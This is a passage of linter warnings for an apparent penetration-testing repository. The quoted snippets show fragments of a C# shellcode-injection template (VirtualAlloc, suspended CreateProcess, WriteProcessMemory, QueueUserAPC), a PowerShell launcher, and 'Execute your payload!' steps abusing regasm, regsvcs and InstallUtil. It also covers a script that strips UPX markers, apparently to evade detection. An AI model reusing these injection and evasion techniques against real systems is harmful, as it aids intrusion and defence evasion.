247 |     if _type not in ["exec", "run-command"] and _format == "exe":
    |

N806 Variable `exeLaunchCode` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:249:9
    |
247 |     if _type not in ["exec", "run-command"] and _format == "exe":
248 |
249 |         exeLaunchCode = string.Template(
    |         ^^^^^^^^^^^^^
250 |             """
    |

W291 Trailing whitespace
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:263:72
    |
261 |             MethodInfo method = asm.EntryPoint;
262 |             object instance = asm.CreateInstance(method.Name);
263 |             method.Invoke(instance, new object[] { new string[] { } }); 
    |                                                                        ^
264 |             return true;
265 |         }
    |
help: Remove trailing whitespace

N806 Variable `launchCode` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:272:9
    |
270 |         )
271 |
272 |         launchCode = exeLaunchCode
    |         ^^^^^^^^^^
273 |
274 |     elif _type not in ["exec", "run-command"] and _format == "raw":
    |

N806 Variable `shellcodeLoader` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:277:13
    |
276 |         if not apc:
277 |             shellcodeLoader = string.Template(
    |             ^^^^^^^^^^^^^^^
278 |                 """
    |

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:279:1
    |
277 |             shellcodeLoader = string.Template(
278 |                 """
279 |         
    | ^^^^^^^^
280 |         [DllImport("kernel32")]
281 |         private static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, UInt32 flAllocationType, UInt32 flProtect);
    |
help: Remove whitespace from blank line

W291 Trailing whitespace
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:319:10
    |
318 |             return true;
319 |         }                                           
    |          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
320 |
321 |         """
    |
help: Remove trailing whitespace

N806 Variable `shellcodeLoader` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:326:13
    |
324 |             )
325 |         else:
326 |             shellcodeLoader = string.Template(
    |             ^^^^^^^^^^^^^^^
327 |                 """
    |

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:336:1
    |
334 |             $payloadCode
335 |             byte[] payload = DecompressString(shellcode);
336 |               
    | ^^^^^^^^^^^^^^
337 |             string processpath = Environment.ExpandEnvironmentVariables(@"$targetProcess");
338 |             STARTUPINFO si = new STARTUPINFO();
    |
help: Remove whitespace from blank line

W291 Trailing whitespace
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:340:60
    |
338 |             STARTUPINFO si = new STARTUPINFO();
339 |             PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
340 |             bool success = CreateProcess(null, processpath, 
    |                                                            ^
341 |             IntPtr.Zero, IntPtr.Zero, false, 
342 |             ProcessCreationFlags.CREATE_SUSPENDED, 
    |
help: Remove trailing whitespace

W291 Trailing whitespace
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:341:45
    |
339 |             PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
340 |             bool success = CreateProcess(null, processpath, 
341 |             IntPtr.Zero, IntPtr.Zero, false, 
    |                                             ^
342 |             ProcessCreationFlags.CREATE_SUSPENDED, 
343 |             IntPtr.Zero, null, ref si, out pi);
    |
help: Remove trailing whitespace

W291 Trailing whitespace
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:342:51
    |
340 |             bool success = CreateProcess(null, processpath, 
341 |             IntPtr.Zero, IntPtr.Zero, false, 
342 |             ProcessCreationFlags.CREATE_SUSPENDED, 
    |                                                   ^
343 |             IntPtr.Zero, null, ref si, out pi);
    |
help: Remove trailing whitespace

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:358:1
    |
356 |             return true;
357 |         }
358 |         
    | ^^^^^^^^
359 |         private static UInt32 MEM_COMMIT = 0x1000;
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:360:1
    |
359 |         private static UInt32 MEM_COMMIT = 0x1000;
360 |        
    | ^^^^^^^
361 |         private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
362 |         private static UInt32 PAGE_READWRITE = 0x04;
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:364:1
    |
362 |         private static UInt32 PAGE_READWRITE = 0x04;
363 |         private static UInt32 PAGE_EXECUTE_READ = 0x20;
364 |         
    | ^^^^^^^^
365 |         [Flags]
366 |         public enum ProcessAccessFlags : uint
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:382:1
    |
380 |           Synchronize = 0x00100000
381 |         }
382 |         
    | ^^^^^^^^
383 |         [Flags]
384 |         public enum ProcessCreationFlags : uint
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:434:1
    |
432 |           public IntPtr hStdError;
433 |         }
434 |         
    | ^^^^^^^^
435 |         [Flags]
436 |         public enum    ThreadAccess : int
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:448:1
    |
446 |           DIRECT_IMPERSONATION    = (0x0200)
447 |         }
448 |         
    | ^^^^^^^^
449 |         [DllImport("kernel32.dll", SetLastError = true)]
450 |         public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle,
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:452:1
    |
450 |         public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle,
451 |           int dwThreadId);
452 |         
    | ^^^^^^^^
453 |         [DllImport("kernel32.dll",SetLastError = true)]
454 |         public static extern bool WriteProcessMemory(
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:460:1
    |
458 |           int nSize,
459 |           out IntPtr lpNumberOfBytesWritten);
460 |         
    | ^^^^^^^^
461 |         [DllImport("kernel32.dll")]
462 |         public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:463:1
    |
461 |         [DllImport("kernel32.dll")]
462 |         public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
463 |         
    | ^^^^^^^^
464 |         [DllImport("kernel32")]
465 |         public static extern IntPtr VirtualAlloc(UInt32 lpStartAddr,
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:471:1
    |
469 |         public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
470 |         Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);
471 |         
    | ^^^^^^^^
472 |         [DllImport("kernel32.dll", SetLastError = true)]
473 |         public static extern IntPtr OpenProcess(
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:478:1
    |
476 | ΓÇª      int processId
477 | ΓÇª     );
478 | ΓÇª     
    ^^^^^^^^
479 | ΓÇª      [DllImport("kernel32.dll")]
480 | ΓÇª     public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThΓÇª
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:489:1
    |
487 |         [DllImport("kernel32.dll")]
488 |         public static extern uint SuspendThread(IntPtr hThread);
489 |         
    | ^^^^^^^^
490 |         [DllImport("kernel32.dll")]
491 |         public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:493:1
    |
491 |         public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
492 |         int dwSize, uint flNewProtect, out uint lpflOldProtect);
493 |       
    | ^^^^^^
494 |       """
495 |             ).safe_substitute(
    |
help: Remove whitespace from blank line

N806 Variable `launchCode` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:502:9
    |
500 |             )
501 |
502 |         launchCode = shellcodeLoader
    |         ^^^^^^^^^^
503 |
504 |     elif _type not in ["exec", "run-command"]:
    |

N806 Variable `powershellLaunchCode` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:505:9
    |
504 |     elif _type not in ["exec", "run-command"]:
505 |         powershellLaunchCode = string.Template(
    |         ^^^^^^^^^^^^^^^^^^^^
506 |             """
507 |         $decompressionFuncs
    |

W291 Trailing whitespace
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:525:10
    |
523 |             runspace.Close();
524 |             return true;
525 |         }      
    |          ^^^^^^
526 |
527 |         """
    |
help: Remove trailing whitespace

N806 Variable `launchCode` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:533:9
    |
531 |         )
532 |
533 |         launchCode = powershellLaunchCode
    |         ^^^^^^^^^^
534 |
535 |     namespaceStart = "namespace " + namespaceName + " {"
    |

N806 Variable `namespaceStart` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:535:5
    |
533 |         launchCode = powershellLaunchCode
534 |
535 |     namespaceStart = "namespace " + namespaceName + " {"
    |     ^^^^^^^^^^^^^^
536 |     namespaceStop = "}"
    |

N806 Variable `namespaceStop` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:536:5
    |
535 |     namespaceStart = "namespace " + namespaceName + " {"
536 |     namespaceStop = "}"
    |     ^^^^^^^^^^^^^
537 |
538 |     if dontUseNamespace:
    |

N806 Variable `namespaceStart` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:539:9
    |
538 |     if dontUseNamespace:
539 |         namespaceStart = namespaceStop = ""
    |         ^^^^^^^^^^^^^^
540 |
541 |     assemblyAdditions1 = """
    |

N806 Variable `namespaceStop` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:539:26
    |
538 |     if dontUseNamespace:
539 |         namespaceStart = namespaceStop = ""
    |                          ^^^^^^^^^^^^^
540 |
541 |     assemblyAdditions1 = """
    |

N806 Variable `assemblyAdditions1` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:541:5
    |
539 |         namespaceStart = namespaceStop = ""
540 |
541 |     assemblyAdditions1 = """
    |     ^^^^^^^^^^^^^^^^^^
542 |
543 | /*
    |

W291 Trailing whitespace
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:558:78
    |
557 |     Step 3: Execute your payload!
558 |         %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe rogue.dll 
    |                                                                              ^
559 |         %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe /U rogue.dll 
    |
help: Remove trailing whitespace

W291 Trailing whitespace
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:559:81
    |
557 |     Step 3: Execute your payload!
558 |         %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe rogue.dll 
559 |         %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe /U rogue.dll 
    |                                                                                 ^
560 |
561 |         %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe rogue.dll
    |
help: Remove trailing whitespace

N806 Variable `assemblyAdditions2` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:570:5
    |
569 | """
570 |     assemblyAdditions2 = """
    |     ^^^^^^^^^^^^^^^^^^
571 |
572 |         // This executes if registration is successful
    |

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:578:1
    |
576 |             Execute();
577 |         }
578 |         
    | ^^^^^^^^
579 |         // This executes if registration fails
580 |         [ComUnregisterFunction]
    |
help: Remove whitespace from blank line

N806 Variable `assemblyAdditions3` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:588:5
    |
586 | """
587 |
588 |     assemblyAdditions3 = string.Template(
    |     ^^^^^^^^^^^^^^^^^^
589 |         """
    |

N806 Variable `assemblyAdditions4` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:604:5
    |
602 |     ).safe_substitute(templateName=templateName)
603 |
604 |     assemblyAdditions4 = " : ServicedComponent"
    |     ^^^^^^^^^^^^^^^^^^
605 |
606 |     if _type != "regasm":
    |

N806 Variable `assemblyAdditions1` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:607:9
    |
606 |     if _type != "regasm":
607 |         assemblyAdditions1 = assemblyAdditions2 = ""
    |         ^^^^^^^^^^^^^^^^^^
608 |         assemblyAdditions3 = assemblyAdditions4 = ""
    |

N806 Variable `assemblyAdditions2` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:607:30
    |
606 |     if _type != "regasm":
607 |         assemblyAdditions1 = assemblyAdditions2 = ""
    |                              ^^^^^^^^^^^^^^^^^^
608 |         assemblyAdditions3 = assemblyAdditions4 = ""
    |

N806 Variable `assemblyAdditions3` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:608:9
    |
606 |     if _type != "regasm":
607 |         assemblyAdditions1 = assemblyAdditions2 = ""
608 |         assemblyAdditions3 = assemblyAdditions4 = ""
    |         ^^^^^^^^^^^^^^^^^^
609 |
610 |     if _type == "exec":
    |

N806 Variable `assemblyAdditions4` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:608:30
    |
606 |     if _type != "regasm":
607 |         assemblyAdditions1 = assemblyAdditions2 = ""
608 |         assemblyAdditions3 = assemblyAdditions4 = ""
    |                              ^^^^^^^^^^^^^^^^^^
609 |
610 |     if _type == "exec":
    |

N806 Variable `launchCode` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:611:9
    |
610 |     if _type == "exec":
611 |         launchCode = """
    |         ^^^^^^^^^^
612 |
613 |       public static bool Execute() {
    |

W291 Trailing whitespace
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:633:77
    |
631 |                   psi.WorkingDirectory = Path.GetDirectoryName(fullPath.Substring(1, pos));
632 |
633 |                   if (pos + 2 < fullPath.Length && fullPath[pos + 2] == ' ') 
    |                                                                             ^
634 |                   {
635 |                       args = fullPath.Substring(pos + 2);
    |
help: Remove trailing whitespace

W291 Trailing whitespace
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:649:15
    |
647 |               return true;
648 |           }
649 |           else 
    |               ^
650 |           {
651 |               int pos = fullPath.IndexOf(" ");
    |
help: Remove trailing whitespace

N806 Variable `launchCode` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:675:9
    |
674 |     elif _type == "run-command":
675 |         launchCode = """
    |         ^^^^^^^^^^
676 |
677 |       public static bool Execute() {
    |

W291 Trailing whitespace
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:700:77
    |
698 |                   psi.WorkingDirectory = Path.GetDirectoryName(fullPath.Substring(1, pos));
699 |
700 |                   if (pos + 2 < fullPath.Length && fullPath[pos + 2] == ' ') 
    |                                                                             ^
701 |                   {
702 |                       args = fullPath.Substring(pos + 2);
    |
help: Remove trailing whitespace

W291 Trailing whitespace
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:716:15
    |
714 |               return true;
715 |           }
716 |           else 
    |               ^
717 |           {
718 |               int pos = fullPath.IndexOf(" ");
    |
help: Remove trailing whitespace

N806 Variable `msiUsing` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:742:5
    |
741 |     method = f"public void {methodName}(string command)"
742 |     msiUsing = ""
    |     ^^^^^^^^
743 |     msiReturn = ""
    |

N806 Variable `msiReturn` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:743:5
    |
741 |     method = f"public void {methodName}(string command)"
742 |     msiUsing = ""
743 |     msiReturn = ""
    |     ^^^^^^^^^
744 |
745 |     if globalOptions["msi_mode"]:
    |

N806 Variable `msiUsing` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:746:9
    |
745 |     if globalOptions["msi_mode"]:
746 |         msiUsing = "using Microsoft.Deployment.WindowsInstaller;"
    |         ^^^^^^^^
747 |         msiReturn = "return ActionResult.Success;"
748 |         method = f"""[CustomAction]
    |

N806 Variable `msiReturn` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:747:9
    |
745 |     if globalOptions["msi_mode"]:
746 |         msiUsing = "using Microsoft.Deployment.WindowsInstaller;"
747 |         msiReturn = "return ActionResult.Success;"
    |         ^^^^^^^^^
748 |         method = f"""[CustomAction]
749 |         public static ActionResult {methodName}(Session session)"""
    |

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:771:1
    |
770 | $namespaceStart
771 |   
    | ^^
772 |     [ComVisible(true)]
773 |     public class $templateName $assemblyAdditions4
    |
help: Remove whitespace from blank line

W291 Trailing whitespace
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:775:31
    |
773 |     public class $templateName $assemblyAdditions4
774 |     {
775 |         public $templateName() 
    |                               ^
776 |         { 
777 |             Execute();
    |
help: Remove trailing whitespace

W291 Trailing whitespace
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:776:10
    |
774 |     {
775 |         public $templateName() 
776 |         { 
    |          ^
777 |             Execute();
778 |         }
    |
help: Remove trailing whitespace

W291 Trailing whitespace
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:788:20
    |
786 |         $assemblyAdditions2
787 |
788 |         $launchCode           
    |                    ^^^^^^^^^^^
789 |     }
    |
help: Remove trailing whitespace

N803 Argument name `filePath` should be lowercase
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:814:21
    |
814 | def detectFileIsExe(filePath, forced=False):
    |                     ^^^^^^^^
815 |     try:
816 |         pe = pefile.PE(filePath)
    |

F841 Local variable `pe` is assigned to but never used
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:816:9
    |
814 | def detectFileIsExe(filePath, forced=False):
815 |     try:
816 |         pe = pefile.PE(filePath)
    |         ^^
817 |         return True
818 |     except pefile.PEFormatError as e:
    |
help: Remove assignment to unused variable `pe`

F841 [*] Local variable `e` is assigned to but never used
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:818:36
    |
816 |         pe = pefile.PE(filePath)
817 |         return True
818 |     except pefile.PEFormatError as e:
    |                                    ^
819 |         return False
    |
help: Remove assignment to unused variable `e`

N806 Variable `templateName` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:996:13
    |
994 |         payload = args.inputFile
995 |
996 |     output, templateName = getSourceFileContents(
    |             ^^^^^^^^^^^^
997 |         args.module,
998 |         args.namespace,
    |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:1057:19
     |
1055 |               cmd = (
1056 |                   p
1057 |                   + ' /o+ /r:System.EnterpriseServices.dll{} /target:{} /out:"{}" /keyfile:key.snk "{}"'.format(
     |  ___________________^
1058 | |                     management, target, args.output, srcfile
1059 | |                 )
     | |_________________^
1060 |               )
1061 |           else:
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:1064:19
     |
1062 |               cmd = (
1063 |                   p
1064 |                   + ' /o+ /r:System.EnterpriseServices.dll{} /target:{} /out:"{}" "{}"'.format(
     |  ___________________^
1065 | |                     management, target, args.output, srcfile
1066 | |                 )
     | |_________________^
1067 |               )
     |
help: Convert to f-string

F841 [*] Local variable `e` is assigned to but never used
    --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:1077:29
     |
1075 |         try:
1076 |             print(out)
1077 |         except Exception as e:
     |                             ^
1078 |             print(
1079 |                 "[!] Error - non printable output coming from csc.exe compiler. Ignoring it..."
     |
help: Remove assignment to unused variable `e`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:1096:16
     |
1094 |               print(output)
1095 |
1096 |       commands = """
     |  ________________^
1097 | |
1098 | | =====================================
1099 | | NEXT STEPS:
1100 | |
1101 | | Step 1: Create Your Strong Name Key -> key.snk (or use the one provided in this directory)
1102 | |
1103 | |     $key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979ΓÇª
1104 | |     $Content = [System.Convert]::FromBase64String($key)
1105 | |     Set-Content key.snk -Value $Content -Encoding Byte
1106 | |
1107 | | Step 2: Compile source code:
1108 | |     %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll{} /target:library /out:rogue.dll /keyfiΓÇª
1109 | |
1110 | | Step 3: Execute your payload!
1111 | |     %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe rogue.dll
1112 | |     %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U rogue.dll
1113 | |
1114 | |     %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe rogue.dll 
1115 | |     %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe /U rogue.dll 
1116 | |
1117 | |     %WINDIR%\\Microsoft.NET\\Framework64\\v2.0.50727\\InstallUtil.exe /logfile= /logtoconsole=false /U rogue.dll
1118 | |     %WINDIR%\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /logtoconsole=false /U rogue.dll
1119 | |     """.format(
1120 | |         management
1121 | |     )
     | |_____^
1122 |
1123 |       if "PROGRAMFILES(X86)" in os.environ:
     |
help: Convert to f-string

W291 Trailing whitespace
    --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:1114:74
     |
1112 |     %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U rogue.dll
1113 |
1114 |     %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe rogue.dll 
     |                                                                          ^
1115 |     %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe /U rogue.dll 
     |
help: Remove trailing whitespace

W291 Trailing whitespace
    --> security\penetration-testing-tools\file-formats\msi-shenanigans\tools\rogue-dot-net\generateRogueDotNet.py:1115:77
     |
1114 |     %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe rogue.dll 
1115 |     %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe /U rogue.dll 
     |                                                                             ^
1116 |
1117 |     %WINDIR%\\Microsoft.NET\\Framework64\\v2.0.50727\\InstallUtil.exe /logfile= /logtoconsole=false /U rogue.dll
     |
help: Remove trailing whitespace

E722 Do not use bare `except`
  --> security\penetration-testing-tools\file-formats\tamperUpx.py:14:5
   |
12 |     try:
13 |         pe = pefile.PE(outfile)
14 |     except:
   |     ^^^^^^
15 |         print("[!] Input PE file corrupted. Unable to proceed.")
16 |         return False
   |

N806 Variable `newSectionNames` in function should be lowercase
  --> security\penetration-testing-tools\file-formats\tamperUpx.py:18:5
   |
16 |         return False
17 |
18 |     newSectionNames = (
   |     ^^^^^^^^^^^^^^^
19 |         ".text",
20 |         ".data",
   |

SIM113 Use `enumerate()` for index variable `sectnum` in `for` loop
  --> security\penetration-testing-tools\file-formats\tamperUpx.py:41:9
   |
39 |     for sect in pe.sections:
40 |         section_offset = section_table_offset + sectnum * 0x28
41 |         sectnum += 1
   |         ^^^^^^^^^^^^
42 |
43 |         if sect.Name.decode().lower().startswith("upx"):
   |

UP032 [*] Use f-string instead of `format` call
  --> security\penetration-testing-tools\file-formats\tamperUpx.py:49:17
   |
47 |               )
48 |               print(
49 | /                 "\tRenamed UPX section ({}) => ({})".format(
50 | |                     sect.Name.decode(), newSectionNames[num]
51 | |                 )
   | |_________________^
52 |               )
53 |               num += 1
   |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
  --> security\penetration-testing-tools\file-formats\tamperUpx.py:66:19
   |
64 |         prev = pe.__data__[pos - 5 : pos - 1]
65 |         if all(chr(c) in string.printable for c in prev):
66 |             print('\tRemoved "{}" indicator...'.format(prev.decode()))
   |                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
67 |             pe.set_bytes_at_offset(pos - 5, b"\x00" * 4)
   |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
  --> security\penetration-testing-tools\file-formats\tamperUpx.py:77:13
   |
76 |           print(
77 | /             "\tOverwriting metadata (version={}, format={}, method={}, level={})...".format(
78 | |                 version, _format, method, level
79 | |             )
   | |_____________^
80 |           )
   |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\file-formats\tamperUpx.py:105:13
    |
104 |           print(
105 | /             "\t\t- uncompressed_adler (u_adler): ({} / 0x{:x}) => (0)".format(
106 | |                 u_adler, u_adler
107 | |             )
    | |_____________^
108 |           )
109 |           pe.set_dword_at_offset(pos + 8, 0)
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\file-formats\tamperUpx.py:111:13
    |
109 |           pe.set_dword_at_offset(pos + 8, 0)
110 |           print(
111 | /             "\t\t- compressed_adler (c_adler): ({} / 0x{:x}) => (0)".format(
112 | |                 c_adler, c_adler
113 | |             )
    | |_____________^
114 |           )
115 |           pe.set_dword_at_offset(pos + 12, 0)
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\file-formats\tamperUpx.py:117:13
    |
115 |         pe.set_dword_at_offset(pos + 12, 0)
116 |         print(
117 |             "\t\t- uncompressed_len (u_len): ({} / 0x{:x}) => (0)".format(u_len, u_len)
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
118 |         )
119 |         pe.set_dword_at_offset(pos + 16, 0)
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\file-formats\tamperUpx.py:120:15
    |
118 |         )
119 |         pe.set_dword_at_offset(pos + 16, 0)
120 |         print("\t\t- compressed_len (c_len): ({} / 0x{:x}) => (0)".format(c_len, c_len))
